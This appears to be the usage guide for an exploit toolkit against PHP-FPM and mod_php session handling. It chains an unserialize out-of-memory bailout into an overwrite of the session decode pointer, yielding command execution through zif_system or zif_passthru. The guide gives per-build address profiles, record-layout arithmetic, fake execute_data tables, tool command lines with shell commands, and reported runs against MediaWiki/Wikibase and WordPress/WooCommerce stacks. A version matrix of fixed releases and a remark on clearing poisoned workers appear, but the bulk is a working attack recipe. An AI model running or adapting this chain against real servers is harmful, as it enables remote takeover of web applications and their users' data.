# USAGE

Install, layout and run one-liners: see `README.md`. This file is the lane matrix, the G2/G6 plan, prerequisites, version matrix and failure diagnosis.

## Lane matrix

| lane | target | producer | consumer | expected receipt | status |
|---|---|---|---|---|---|
| modphp machinery | libphp.so PHP 8.5.10 NTS, httpd prefork | `producer_modphp` filename length N ladder | tiny multipart plus GET arms | HTTP 200, 149 B fatal transcript, worker survives | dry wired, live gated |
| modphp app unserialize | lab unserialize endpoint | `producer_unser` master shape class payload | tiny multipart plus GET arms | HTTP 200, fatal transcript at the class tried alloc, worker survives | dry wired, live gated by `--unser-url` |
| modphp pDestructor superglobal teardown | libphp.so PHP 8.5.10 NTS, httpd prefork | plant, then pre-RINIT upload progress decode | none (automatic shutdown path) | `$_POST` write lands at `heap+0x2060`, but fast shutdown destroys no auto global table | **closed**: `fast_shutdown=1` skips `zend_hash_graceful_reverse_destroy(EG(symbol_table))`; POST rc stays 1 |
| fpm app fatal | php-fpm 8.5.10 static pool | post startup app level fatal inside the unserialize family | none | worker exits 70, no access row | measured, not a route by itself |
| fpm G2 decode hijack | php-fpm 8.5.10, 8.4.25, 8.1.34, 7.4.33 ET_EXEC, ASLR off | `E_USER_ERROR` bailout inside `unserialize` | multipart session record plus forced END decode | marker created, worker survives, decode pointer overwritten | 8.5.10 confirmed lab; other profiles derived, offline `--step g2` |
| fpm G6 zif decode | php-fpm 8.5.10, 8.4.25, 8.1.34, 7.4.33 ET_EXEC, ASLR off | same G2 plant | the G2 write points `ps_serializers[2].decode` at `zif_system` / `zif_passthru`; the record is a fake `zend_execute_data` | `zif_system`: marker created, then SIGSEGV at `php_exec+450`; `zif_passthru`: HTTP 200, marker recreated, worker survives | 8.5.10 live lab G6; other profiles binary-derived; offline `--step g2 --g2-decode ...` |
| F12b realapps zif decode | installed php-fpm 8.5.10 ET_EXEC, MediaWiki/Wikibase, ASLR off | anonymous `/api.php` Wikibase OOM (`application/vnd.php.serialized`, 500 KB probe) | the `php` session record overwrites `ps_serializers[1].decode` (`0x22c54c8`) with `zif_system` (`0xa3c061`); the record is the fake `execute_data` | marker `WIKI_ZIF` created at `00:29:18`; worker SIGSEGV at `php_exec+466`; FPM respawn; nginx 502 then health 200 | **confirmed private ASLR-off RCE**; `zif_passthru` (`0xa3c074`) clean gdb-free run in `receipts/realchain_20261022/` |
| modphp in band leak | libphp.so PHP 8.5.10 NTS PIE | M5 plant and trigger | `sidlen` / `sidhex` overread | live session array pointer over HTTP, 4 of 4 runs | measured, `leak_offset` build specific; boot2 HTTP candidate (`K_dest` at `sidhex[8:16]`, `B0 = K_dest - 0x1000`) lab-only |
| static session file leak | libphp.so PHP 8.5.10 NTS PIE, mod_php | failed `ini_set` save_path restore, 54 B GET reclaim | M11 encode overread, static GET of `sess_tb1` | 77,842 B seed served with matching sha1; overread crashed in `tmp_var` | **reproduced on real target (F14)**: the mod_php lane was attempted-negative; the WP/WooCommerce FPM 8.5.10 stack under ASLR on served the leaked `K_dest` and a gdb-free `zif_passthru` marker; `receipts/realchain_20261022/` |
| real apps | MediaWiki/Wikibase, WordPress/WooCommerce | anonymous app request | app specific | Wikibase fatal and worker survival, WP 1 of 4 consumers SIGSEGV | reachability and availability; F12b separately confirms RCE on the private realapps 8.5.10 target |

## F14 leak status

F14 is **reproduced on a real target**. The mod_php lane proved the M6 save path
control (failed `ini_set`/deactivate restore, dangling `PS(save_path)`, 54 B GET
reclaim, `ps_files_open` on the attacker directory) and static serving
(`GET /u/sess_tb1` returned the seeded 77,842 bytes with a matching sha1), but
its M11 encode overread failed: the 64,946 B plant (`0x10000` class) and 77,842 B
trigger (`0x14000` class) put the trigger `+0x2000` away, stale `P` landed in
filler, and the worker took SIGSEGV in `tmp_var`
(`last_dtor=0x4141414141414141`). That lane's controls are partial: 21 exchanges
against a bound of 20 and 3 of 3 restarts, with the formal no-save-path,
file-not-present and different-sid controls not executed.

The realapps WordPress/WooCommerce + HexCoupon FPM 8.5.10 stack then reproduced
the route under ASLR on (`randomize_va_space=2`): PHP-writable upload directory
served by the same server, attacker controlled `sess_<sid>` name and bytes,
`save_path` restored per request, OOM under `memory_limit` with upload progress,
and app-level `session_start` with an attacker-chosen sid. The free MultiStep
Forms for Contact Form 7 plugin wrote a 388,350 B native session file through an
unauthenticated form; the real `LoyaltyProgramHelpers::start_session()` OOM left
the stale state; the static session file served the leaked `K_dest` (1,052,954 B,
4,096 B `S` value); and the final gdb-free request created `MARK_REAL` through
`zif_passthru` with worker `572531` alive. `P` and `B0` still came from a gdb
calibration before the final request; the final request itself attached nothing.
Receipt: `receipts/realchain_20261022/`.

`fpmboot` is fixed-layout ASLR-off (`B0 = K_dest1 - 0x9000`). The mod_php boot2
HTTP leak (`K_dest` at `sidhex[8:16]`, `B0 = K_dest - 0x1000`) remains lab-only.
The MediaWiki/Wikibase ASLR-on survey found no in-band heap pointer. Receipts:
`/tmp/opencode/research/staticleak_20261021T214538Z/README.md` (with
`SHA256SUMS`) and `/tmp/opencode/research/boot2_20261021T214428Z/README.md`.

## Prerequisites

| item | value | receipt |
|---|---|---|
| python | 3.10 or newer, stdlib only | `README.md` |
| receipt dir | `files/io/<target>-<step>-<UTC stamp>`, git ignored | `README.md` |
| modphp stack | httpd 2.4.66 plus libphp.so PHP 8.5.10 NTS | `run_20261021T155303Z_armoom` |
| modphp `memory_limit` | 2M `php_value`; absence or 128M means the knob is off and no OOM fires | `run_20261021T155303Z_armoom` phase C |
| `post_max_size` | 8388608 B | `info.php` receipt |
| `upload_max_filesize` | 2M | `info.php` receipt |
| `max_file_uploads` | 20 | `info.php` receipt |
| `session.use_only_cookies` | 1, the sid travels in the Cookie header | `info.php` receipt |
| fpm `fastcgi_request_buffering` | off, so client body pauses reach the pool | blueprint section F.3 |
| fpm `session.upload_progress.min_freq` | 1 s default, the body stall must exceed it | blueprint section F.3 |

## Step map

| step | sends | output |
|---|---|---|
| `recon` | one GET when `--live` is set | fingerprint and addresses |
| `producer` | no, unless `--live` | request bytes and `result.json` |
| `write_stage` | never | final forged multipart bytes |
| `leak` | never | dry modphp calibration plan |
| `g2` | never | `g2-record.bin`, profile, md5, decode mode and plan JSON |
| `chain` | modphp sequence dry by default; fpm legacy path is live | per-candidate receipt |

## G2 / G6 plan

G2 is the confirmed FPM route on the plain PHP 8.5.10 build, with derived profiles
for 8.4.25, 8.1.34 and 7.4.33. A controlled bailout leaves a stale
`BG(unserialize)` dtor chain. The pre RINIT upload progress session decode reuses
it, and the typed zval write reaches `ps_serializers[2].decode` in `.data`. The
forced END decode then calls the overwritten pointer with the session record bytes
as `rdi`.

G6 uses the same write but points `ps_serializers[2].decode` at
`zif_system` or `zif_passthru`. The record doubles as a fake
`zend_execute_data`; `zif_system` executes the command but is one-shot because
its `return_value` write crashes, while `zif_passthru` is the clean surviving
control.

F12b is the real-target proof of the same decode overwrite on the installed
realapps PHP 8.5.10 binary, whose active handler is `php` (not `php_binary`):
the write lands on `ps_serializers[1].decode` (`0x22c54c8`) and the record is a
`php`-format session. The profile is `addresses/g2_fpm_realapps_8510.json`,
selectable with `--g2-profile realapps-8.5.10` or its md5. It carries
`record_builder: php_binary_zif`, so the offline `--step g2` builder plans the
`php_binary` entry (`ps_serializers[2].decode`, `0x22c54e0`); the F12b
`php`-slot record (`0x22c54c8`, 8 mod 16) still comes from the receipt's
`scripts/mkrec.py`.

Inputs, all explicit:

| flag | meaning | default |
|---|---|---|
| `--g2-profile` | profile version, binary md5 or `.json` path (`realapps-8.5.10` selects the F12b profile) | 8.5.10 |
| `--g2-x` | first decode buffer `zend_string` X1 (planted T1) | required |
| `--g2-x2` | second decode buffer `zend_string` X2 (re-encoded T2); the fake execute_data is read from it | required for zif modes |
| `--g2-decode` | `php_binary` (G2), `zif_passthru` (G6 clean) or `zif_system` (G6 one-shot) | `php_binary` |
| `--g2-p` | stale `php_unserialize_data` P, relative to X1 | required |
| `--g2-b0` | stale `var_dtor_entries` B0, relative to X1 | required |
| `--g2-total` | session record length | profile lab geometry, 131014 |
| `--g2-target` | 16 byte aligned write slot; zif modes keep this slot and write the profile zif address as `i:<n>;` | `ps_serializers[2].decode` from the selected profile |
| `--g2-value` | serialized long written at the target (php_binary only) | `i:1;` |
| `--libc-base` | libc base, `system = base + 0x53090` (php_binary only) | none |
| `--command` | php_binary: shell command padded to 32 bytes, must end `#`; zif: NUL-free command, no padding | php_binary `id;exit;#`, zif `id` |

Profiles are md5 locked. `PROFILE_MD5` in `tool/modules/g2_chain.py` maps each md5
to one JSON; a version label is only a convenience key. A binary whose md5 is not
in the table has no profile.

| version | md5 | decode target A | PS(serializer) | `zend_eval_string` | ELF | evidence |
|---|---|---|---|---|---|---|
| 8.5.10 | `825470df6b9fa7d0178a1a9bcf4ce6dc` | 0x14c1b60 | 0x14c6160 | 0x9cfd10 | ET_EXEC | live G2, marker created |
| 8.4.25 | `95cca39b95cb5f2d5b897fc5cc6e8628` | 0xe01180 | 0xe03a60 | 0x873790 | ET_EXEC | built non PIE FPM binary, offsets derived, no live run |
| 8.1.34 | `6ea2762ef76f44674805736e19570bb1` | 0xe01140 | 0xe02fb0 | 0x7ec4d5 | ET_EXEC | built non PIE FPM binary, offsets derived, no live run |
| 7.4.33 | `9c7b5c2287fdebe6b3324223034715da` | 0xe010a0 | 0xe02df0 | 0x7cd5ab | ET_EXEC | built non PIE FPM binary offsets, no live G2; write shape reproduced 4/4 |
| realapps 8.5.10 | `4ee099823b75e16ea36f93c71d57bfd8` | `0x22c54c8` (`php` decode) | `0x22d0f20` | not recorded | ET_EXEC | live F12b real-target: `zif_system` marker and one-shot SIGSEGV; `zif_passthru` `0xa3c074` clean gdb-free run in `receipts/realchain_20261022/` |

The four lab profiles are ET_EXEC non PIE with image base 0x400000. The
`ps_serializers[2].decode` and `PS(serializer)` slots are 16 byte aligned in all
four. Each carries libc `system` offset 0x53090 and `popen` 0x7ff90. The
realapps profile is ET_EXEC non PIE as well, but its F12b target is the
`php` decode slot `0x22c54c8` (8 mod 16), reached through an 8 mod 16 fake B0f;
the offline builder plans its `php_binary` entry (`0x22c54e0`), while the F12b
`php`-slot record is still built by the receipt's `scripts/mkrec.py`.

Handler choice matters for the generic builder. The builder resolves the target
from the profile entry named `php_binary` (`_serializer_entry`), not from
`ps_serializers.default_target`: on the four lab profiles both point at the same
slot, while on realapps `default_target` is the F12b `php` slot `0x22c54c8` and
the `php_binary` slot is `0x22c54e0`. The lab uses `php_binary`,
whose decode slot is `table + 0x40` and 16 byte aligned. The default `php`
serializer decode slot is `table + 0x28` and is 8 mod 16. The generic builder
places the fake B0 at the 16 byte aligned stale B0, so its write slot is 0 mod
16 and cannot land on the `php` decode field. For the default `php` handler,
target `PS(serializer)` at `ps_globals + 0x160` for 8.4/8.5 or `+0x130` for
8.1/7.4, and write a pointer to a 24 byte fake `ps_serializer` struct in the
record (name at +0, encode at +8, decode at +0x10). Use `--g2-target
<PS(serializer)>` with `--g2-value 'i:<decimal fake struct address>;'`. The plan
emits `ps_serializer_slot`, and the profile records the fake struct layout. The
second slot writes at `target + 16` and zeroes the type at `target + 24`, so
verify the neighboring `ps_globals` fields before using this route. F12b is the
exception: it places B0f at 8 mod 16 and uses a `php`-format record (not emitted
by `--step g2`) to reach `ps_serializers[1].decode` directly.

`zend_eval_string` and `zend_eval_stringl` are recorded in each profile but are
not decode targets: `zend_eval_string` receives `ZSTR_LEN` as `rsi`, and
`zend_eval_stringl` treats a non NULL `retval_ptr` as a zval and does
`ZVAL_COPY_VALUE`, a wild write for a nonzero length.

`--g2-value` and `--libc-base` are mutually exclusive. The profile binds the
system offset `0x53090` to the lab glibc; the binary imports no `system` symbol,
only `popen`, `execvp`, `fork` and `posix_spawn` PLT entries.

Arithmetic and record shape:

```
used_slots = (target - (B0 + 0x10)) / 16
slot       = B0 + 0x10 + 16 * used_slots
second     = target + 16
type zero  = target + 8 and target + 24
record     = [0x20][32 byte command][i:<n>;] + [0x01]['z']s:<L>:"<payload>";
payload    = fake php_unserialize_data at P - (X + 24)
             fake var_dtor_entries at B0 - (X + 24)
```

The fake P carries `last=P+56`, `first_dtor=last_dtor=B0`, `max_depth=0x7fffffff`
and `entries.used_slots=1018`. The fake B0 carries `used_slots=K` and `next=0`.
The command padding rule is required because the 0x20 key length byte is also
the leading space of the shell command; the trailing `#` comments out the
serialized long that follows.

Example, receipt geometry and libc base:

```sh
python3 -m tool --step g2 \
  --g2-x 0x7ffff7a6a000 --g2-p 0x7ffff7a81000 --g2-b0 0x7ffff7a84000 \
  --g2-total 131014 --command 'touch /tmp/fpmgadget_sys;exit;#' \
  --libc-base 0x7ffff7c9c000 --output files/io/g2-receipt
```

Expected record: 131014 bytes, sha256
`373b4bb1dabda7e4417942ef0b1cd75bbe3880f83b4d1b10187cf66708e075e8`,
`used_slots -8796082913867`, `p_off 94184`, `b_off 106472`, `payload_start 63`,
`L 130949`, `system 0x7ffff7cef090`.

G6 clean control, same geometry plus the second decode buffer:

```sh
python3 -m tool --step g2 --g2-decode zif_passthru \
  --g2-x 0x7ffff7a6a000 --g2-x2 0x7ffff7aae000 \
  --g2-p 0x7ffff7a81000 --g2-b0 0x7ffff7a84000 \
  --command 'touch /tmp/FPM_ZIF' --output files/io/g6-passthru
```

Swap `--g2-decode zif_system` for the one-shot proof. `--g2-target` remains
`0x14c1b60`; the record writes `i:8976055;` (passthru) or `i:8976039;`
(system). `--g2-x2` is mandatory, and `--g2-value`/`--libc-base` are rejected.

`--g2-profile` selects offsets only. X, P, B0, the libc base and the record
length remain target specific; do not reuse the 8.5.10 receipt geometry on
another build.

Self-checks run before the record is written: 32 byte key, serialized long,
target 16 byte alignment, negative `used_slots`, second slot below B0, fake P
and fake B0 inside the payload, record length convergence. The zif modes also
check the 96-byte key1, the exact negative-K arithmetic, the fake execute_data
ranges (`F`, `F+0x10`, `F+0x18`), a non-empty NUL-free command, and that fake P/B0
do not overlap the fake execute_data. A failed check or a missing address exits
2 with the reason in `result.json`.

G2 preconditions and limits:

| item | requirement |
|---|---|
| binary | md5 locked profile; ET_EXEC non PIE at image base 0x400000, or a binary base leak |
| profile | select by md5 or version label; a binary md5 mismatch invalidates every offset |
| serializer | `php_binary` decode is 16 byte aligned; the default `php` handler uses the `PS(serializer)` slot plus a fake 24 byte struct |
| libc | base for `system`, or a fixed target that accepts `(char *, size_t)`; the fixed target route is not demonstrated |
| heap | X, P, B0 and the exact record length |
| G6 zif decode | X1 and X2 plus P and B0; profile `zif_system`/`zif_passthru`; `zif_passthru` is the clean control, `zif_system` is one-shot |
| F12b realapps (php) | md5 `4ee099823b75e16ea36f93c71d57bfd8`; `php` handler; target `ps_serializers[1].decode` `0x22c54c8` reached through the 8 mod 16 `B0f=0x7ffff2002018`; record shape `php_session_zif` is built by the receipt's `mkrec.py`, not by `--step g2`; `zif_passthru` `0xa3c074` clean gdb-free run in `receipts/realchain_20261022/` |
| FPM setup | upload progress on with the forced END update in the same request |
| ordering | the plant request must be the immediately preceding request on the same worker |
| retries | single shot per plant; the corrupt decode pointer persists until worker restart |
| ASLR | on in the realchain target (`randomize_va_space=2`): the served session file supplies `K_dest` (F14) and the final `zif_passthru` request is gdb-free; `P`/`B0` still come from a pre-final gdb calibration. The FPM lab G2/G6 lanes remain ASLR off; boot2 HTTP candidate is lab-only; `fpmboot` is fixed-layout ASLR-off |

Confirmed on 8.5.10 in two plant runs (n=7, n=11), same worker, marker created.
The 8.4.25, 8.1.34 and 7.4.33 profiles are derived from built non PIE FPM
binaries and were not run live. A wrong X either leaves the plant chain in place
or crashes `var_push`; a wrong record length can crash the second decode. No
claim is made for other session savers, opcache, ZTS or shared pools. 5.x cannot
reuse this geometry: `php_unserialize_data` has a different field order,
`used_slots` is at `+0x2000`, `next` at `+0x2008`, the bound is equality, and
`BG(unserialize)` is a struct.

## G6 zif decode (lab RCE)

G6 is the positive extension of the G2 serializer write: on 8.5.10 the write
points `ps_serializers[2].decode` at `zif_system` (`0x88f6a7`) or
`zif_passthru` (`0x88f6b7`). Decode #1 is the G2 write on the planted
131,014-byte buffer (`T1`); the request re-encodes the same record to 131,313
bytes (`T2`); decode #2 calls the overwritten pointer with
`rdi = ZSTR_VAL(data) = 0x7ffff7aae018` and `rsi = ZSTR_LEN(data) = 0x200f1`
(131,313). The lab gdb trace for `zif_system` recorded
`ser2decode=0x88f6a7`, `php_exec_ex` with
`rdx=0x1 numargs=1 arg1val=0x7ffff7aae18f arg1type=6`,
`php_exec type=1 cmd=... array=(nil) retval=0x200f1`, and the command created
`FPM_ZIF`. The worker then took SIGSEGV at `php_exec+450` (`mov %rax,(%rcx)`,
`rcx=0x200f1`).

Minimal fake `execute_data` parse (S is the raw session buffer,
`ZSTR_VAL(data)`):

| location | value | requirement |
|---|---|---|
| `S+0x2c` | `1` (u32) | `num_args == 1` |
| `S+0x50` | `F` | argument 1 zval value pointer |
| `S+0x58` | `6` | zval type `IS_STRING` |
| `F+0x10` | `strlen(F+0x18)` | fake `zend_string` length |
| `F+0x18` | command | non-empty, NUL-terminated, no embedded NUL |
| `S+0x18` / `S+0x20` | unread | `func` / `arg_info` are not required |

The command does not need the php_binary 32-byte padding or trailing `#`. The
96-byte binary key supplies the call fields and is written back verbatim by the
re-encoder. With the 8.5.10 receipt geometry (`X1=0x7ffff7a6a000`,
`X2=0x7ffff7aae000`, `P=0x7ffff7a81000`, `B0=0x7ffff7a84000`, total 131014):

```
rec1_len      = 107             # 1 + 96-byte key + i:8976055;
Q             = payload_start  # 0x77 (L has 6 decimal digits)
L             = 130893
F             = X2 + 0x18 + Q + 0x100 = 0x7ffff7aae18f
command       = X2 + 0x18 + Q + 0x118 = 0x7ffff7aae1a7
used_slots K  = (0x14c1b60 - (B0 + 0x10)) / 16 = -8796082913867
```

Q is derived from the record geometry, not fixed: the decimal width of the
serialized zif address changes rec1. The lab zif values have 7 digits
(`Q=0x77`); realapps `zif_passthru` `0xa3c074` is 10731636, 8 digits, so
`Q=0x78`. The arg1 pointer F is always `X2 + 0x18 + Q + 0x100`; a hardcoded
`0x77` would point one byte before F. The builder asserts this derivation on
the assembled key1.

The record is `[0x60][96-byte key][i:<zif decimal address>;]` plus
`\x01zs:<L>:"<payload>";`; the fake P and B0 sit in the payload relative to X1,
and `F` is relative to X2. Hashes for the reference command
`touch /tmp/opencode/research/g6zif_20261021T222434Z/FPM_ZIF`:
`zif_system` `3ba454f85777e57230330fd483401dbfd384570b635d0818b0a93e4454f7354f`,
`zif_passthru` `a3622221a56ef25cb1e652a590b0fd22f52a2c919bd9aeff28957b448b81a84f`.

Clean control: the identical chain with `zif_passthru` recorded
`ser2decode=0x88f6b7`, `php_exec_ex rdx=0x3`, `php_exec type=3`, returned
HTTP 200 (`PID=1249787`), recreated the marker and kept the worker alive.
`type=3` never writes `return_value`. `zif_system` is therefore one-shot: with
`type=1`, `php_exec()` always writes a return zval through
`return_value=ZSTR_LEN(data)`; here that is the integer `0x200f1`, so the write
at `php_exec+450` is unconditionally non-canonical. There is no parameterless
way to avoid it for `zif_system`. `zif_passthru` is the preferred clean target.

### Poison and worker recycling

The overwrite is a write into `ps_serializers[...].decode` in the worker's
private `.data` mapping. It is worker-local: the FPM master's copy is unchanged
and other workers do not see it.

- A non-crashing decode (for example `num_args=0` -> PHP `ArgumentCountError`)
  leaves the slot patched. The worker stays alive and keeps serving with the
  poisoned decode pointer.
- With `pm.max_requests=0` the poison persists for the worker lifetime. A finite
  limit only delays recycling until the request count is reached.
- Only worker recycle/restart clears it. A crafted crashing decode (for example
  `num_args=1` with an invalid arg pointer -> SIGSEGV in
  `zend_str_has_nul_byte`) makes FPM respawn from the pristine master; the new
  worker has the real decode pointer again.
- A crash respawn is not remediation: any non-crashing request in between keeps
  the backdoor. Kill/reload the pool workers explicitly after compromise.

Receipt: `receipts/realzif_entry2_1022/README.md` (worker slot stayed `0xa3c074`
after the clean and `num_args=0` decodes; the `num_args=1` crash respawned
worker 143459 with `0x9e6dd5`).

| version | target slot | `zif_system` | `zif_passthru` | `php_exec_ex` | `php_exec` | state |
|---|---|---|---|---|---|---|
| 8.5.10 | `0x14c1b60` | `0x88f6a7` | `0x88f6b7` | `0x88f435` | `0x88f21f` | live G6, ASLR off |
| 8.4.25 | `0xe01180` | `0x753d20` | `0x753d30` | `0x753aa3` | `0x75388d` | binary-derived |
| 8.1.34 | `0xe01140` | `0x7348f9` | `0x734909` | `0x73467d` | `0x734467` | binary-derived |
| 7.4.33 | `0xe010a0` | `0x71dd66` | `0x71dd76` | `0x71daf7` | `0x71d7fc` | binary-derived |

The delta is profile data, never a builder constant: `+0x10` on the four lab
binaries, `+0x13` on realapps (`0xa3c061`/`0xa3c074`, both 19-byte symbols).
The builder reads `zif_passthru` from the selected profile and cross-checks any
`zif_route` delta; it never synthesizes `zif_system + 0x10`. Only 8.5.10 is a
live G6 run; the other symbols are binary-derived profile data. G6 still needs
X1, X2, P and B0, and no
ASLR-capable heap leak is demonstrated. The G6 proof is a private ASLR-off lab
run, not a real-target claim. Receipt:
`/tmp/opencode/research/g6zif_20261021T222434Z/README.md`.

## F12b realapps zif decode (real-target RCE)

F12b is the real-target proof of the same serializer-decode overwrite, on the
installed realapps PHP 8.5.10 binary
(`/tmp/opencode/realapps/install_realapps_np/sbin/php-fpm`, md5
`4ee099823b75e16ea36f93c71d57bfd8`, BuildID
`aa489b7c8674d3aa17ecc4e471b152c05bc960b2`, ET_EXEC). The active handler is
`php`, so the write target is `ps_serializers[1].decode` (`0x22c54c8`, entry
`0x22c54b8`); the original handler is `ps_srlzr_decode_php` (`0x9e6fae`).

Producer: anonymous `POST /api.php` on the private nginx 1.30.1
`127.0.0.1:28866`, with
`action=parse&format=json&contentmodel=wikibase-item&contentformat=application/vnd.php.serialized`
and `text@probe_huge450.ser` (500,000 B). The 1024 MiB OOM (5,242,880 B
attempted allocation) in `EntityContentDataCodec.php:210` leaves
`BG(unserialize).level=1` and the stale `P=0x7ffff218c000`,
`B0=0x7ffff219e000` (`used_slots=1`). The consumer must be the next request on
the same worker.

Write: the fake `php_unserialize_data` at P points `last_dtor` to
`B0f=0x7ffff2002018`; `B0f.used_slots = -8,796,076,063,926`, so `var_tmp_var`
returns `B0f + 0x10 + 16*K = 0x22c54c8`. The 16-byte zval write puts
`0xa3c061` in the decode value word and `0x4` in the type word at `0x22c54d0`;
normalize later zeroes the type word. The record is 36,101,091 bytes: 18 filler
1.9 MB strings, one 768-byte forged-name variable with a 1.9 MB value, then
`z|i:10731617;`.

Fake `execute_data` (`S = ZSTR_VAL(data) = X2 + 0x18`):

| location | value | requirement |
|---|---|---|
| `S+0x18` | `F = 0x7ffff2001218` | `func`; set as specified, not dereferenced |
| `S+0x2c` | `1` (u32) | `num_args == 1` |
| `S+0x50` | `F` | argument 1 zval value pointer |
| `S+0x58` | `6` | zval type `IS_STRING` |
| `F+0x10` | `64` | fake `zend_string` length (`strlen(F+0x18)`) |
| `F+0x18` | `touch .../WIKI_ZIF;` | 64-byte NUL-free command |
| `F+0xc8` | unset | not used on this path; handler is at `+0x58` but never dispatched |

Call flow:

```
php_session_rfc1867_update -> php_session_initialize -> php_session_decode
  -> ps_serializers[1].decode (zif_system 0xa3c061)
  -> php_exec_ex (0xa3bdfd) -> php_exec (0xa3bbd7) -> popen -> /bin/sh -c
```

Marker: `/tmp/opencode/research/f12b_zif_20261021T222457Z/WIKI_ZIF`, size 0,
mtime `2026-10-22 00:29:18.161419346 +0200`, sha256
`e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`.

One-shot crash: `php_exec` then wrote the empty-string return zval through
`return_value = ZSTR_LEN(data) = 0x1d0230` (the decode ABI passes `rsi=len`;
`zif_system` treats it as `zval *return_value`), an address in the binary's
`01000000-01eac000 r--p` mapping. `rip=0xa3bda9` (`php_exec+466`,
`mov %rax,(%rcx)`), SIGSEGV; worker 1246030 exited. FPM master 1086116
respawned worker 1249940; nginx returned 502 (157 B), and a later
`GET /index.php?title=Main_Page` returned 200. The pool survived; the worker
that ran the exploit did not.

The `zif_passthru` symbol on this binary is `0xa3c074` (verified with `nm -an`
and `readelf -sW`; `zif_system + 0x13`, not the lab `+0x10`). Its clean
real-target run is `receipts/realchain_20261022/`: ASLR on, `MARK_REAL` created
by a gdb-free request, worker `572531` alive. That run used the entry-1 `php`
slot; the separate `php_binary` entry (`ps_serializers[2]`, decode `0x22c54e0`)
has its own clean `zif_passthru` run in `receipts/realzif_entry2_1022/README.md`.
F12b itself remains a private
ASLR-off proof; `P`/`B0` still came from a pre-final gdb calibration, the
MediaWiki/Wikibase ASLR-on survey found no in-band leak, the boot2 candidate is
lab-only, and no internet exploitation is claimed. The profile
`addresses/g2_fpm_realapps_8510.json` is selectable with `--g2-profile
realapps-8.5.10` (or its md5); `record_builder` is `php_binary_zif`, so the
builder resolves the target by entry name and plans `0x22c54e0` rather than the
profile's `default_target` (`0x22c54c8`). The F12b `php`-slot record still comes
from the receipt's `scripts/mkrec.py`. Receipt:
`/tmp/opencode/research/f12b_zif_20261021T222457Z/README.md`.

## modphp machinery lane

| N filename bytes | request body bytes | expected alloc bytes | expected HTTP | transcript | worker | receipt |
|---|---|---|---|---|---|---|
| 262144 | 4983500 | 266240 | 200 | 149 B fatal | survives | `run_20261021T155303Z_armoom` |
| 330000 | 6272764 | 331776 | 200 | 149 B fatal | survives | `run_20261021T155303Z_armoom` |
| 400000 | 7602764 | 401408 | 200 | 149 B fatal | survives | `run_20261021T155303Z_armoom` |
| any | 20 file parts | alloc rule `((N // 4096) + 1) * 4096` | 200 | 149 B fatal | 11 of 11 survive | `run_20261021T155303Z_armoom` |

## modphp app unserialize lane

| class | memory_limit bytes | H | P | P_max | payload bytes | tried alloc bytes | stock post cap | transport |
|---|---|---|---|---|---|---|---|---|
| 2M | 2097152 | 32769 | 10000 | 10748 | 342176 | 2621440 | 342176 below 8388608 | allowed |
| 8M | 8388608 | 131073 | 60000 | 65535 | 1528609 | 10485760 | 1528609 below 8388608 | allowed |
| 128M | 134217728 | 2097153 | 4000000 | 4194303 | 48777252 | 167772160 | 48777252 above 8388608 | refused pre connect, exit 2 |

## FPM lane prerequisites

| prerequisite | value | evidence |
|---|---|---|
| request startup | `php_request_startup()` must succeed; a machinery OOM before startup is lethal | `run_exit70` section 1 |
| exit 70 | `FPM_EXIT_SOFTWARE`, an uncaught `zend_bailout`; no access row | 12 machinery OOMs, 12 exit 70 in `run_exit70` |
| producer position | post startup fatal inside the unserialize family (`session_start`, `session_decode`, `unserialize`, WP `maybe_unserialize`) | blueprint section F.2 |
| app level control | EditPage OOM at 8000032 tried bytes never caused exit 70; the worker served arms 15 s later | `run_exit70` harvest G |
| consumer arm | small arm only, 4 filenames of 4096 bytes, machinery fits the 8M pool | `run_smallarm` |
| body stall | `fastcgi_request_buffering off`, pause above `session.upload_progress.min_freq` 1 s | blueprint section F.3 |
| wp producer data | attacker controlled serialized string persisted on the server (user meta, transients) | blueprint section F.2 |

## Version matrix

| branch | audited vulnerable | first fixed | note |
|---|---|---|---|
| 8.5 | 8.5.10 (live), 8.5.11 (source) | 8.5.12 | `php_basic_early_rinit` resets `BG(unserialize)` before `sapi_activate` |
| 8.4 | 8.4.25 (source) | 8.4.27 | 8.4.26 is structurally identical to 8.4.25 |
| 8.3 | 8.3.27 (source) | 8.3.36 | same early reset |
| 8.2 | 8.2.29 (source) | 8.2.35 | same early reset |
| 8.1, 8.0, 7.x, 5.x | EOL, unpatched | none | 7.4.33 write reproduced 4/4; 5.x G2 geometry differs |

G2 offsets by build, keyed by binary md5, not by version:

| version | md5 | decode target A | PS(serializer) | `zend_eval_string` | ELF | evidence |
|---|---|---|---|---|---|---|
| 8.5.10 | `825470df6b9fa7d0178a1a9bcf4ce6dc` | 0x14c1b60 | 0x14c6160 | 0x9cfd10 | ET_EXEC | live G2, marker created |
| 8.4.25 | `95cca39b95cb5f2d5b897fc5cc6e8628` | 0xe01180 | 0xe03a60 | 0x873790 | ET_EXEC | built non PIE FPM binary, offsets derived, no live run |
| 8.1.34 | `6ea2762ef76f44674805736e19570bb1` | 0xe01140 | 0xe02fb0 | 0x7ec4d5 | ET_EXEC | built non PIE FPM binary, offsets derived, no live run |
| 7.4.33 | `9c7b5c2287fdebe6b3324223034715da` | 0xe010a0 | 0xe02df0 | 0x7cd5ab | ET_EXEC | built non PIE FPM binary offsets, no live G2; write shape reproduced 4/4 |
| realapps 8.5.10 | `4ee099823b75e16ea36f93c71d57bfd8` | `0x22c54c8` (`php` decode) | `0x22d0f20` | not recorded | ET_EXEC | live F12b real-target: `zif_system` marker and one-shot SIGSEGV; `zif_passthru` symbol verified only |

The fix does not remove the write primitive; it removes the stale global that
lets the attacker choose P and B0. `ps_serializers` and `ps_globals` are build
specific, so key on md5 or build id. The default `php` handler decode slot is not
16 byte aligned; use the `PS(serializer)` slot and a fake 24 byte
`ps_serializer` struct. 5.x cannot reuse this geometry: `php_unserialize_data`
is `{first, last, first_dtor, last_dtor}`, dtor entries use `zval *data[1024]`
with `used_slots` at `+0x2000` and `next` at `+0x2008`, the bound is equality, and
`BG(unserialize)` is a struct not a pointer.

## Real targets

| app | request | result |
|---|---|---|
| MediaWiki 1.46.2 + Wikibase REL1_46 | anonymous `action=parse`, `contentmodel=wikibase-item`, `contentformat=application/vnd.php.serialized` | 52,065 B blob exhausts 1 GiB inside `php_var_unserialize_internal` at depth 1,533; HTTP 500; the FPM child survives and serves the next request on the same PID; `BG(unserialize).level=1` and the dtor chain survive into the next request |
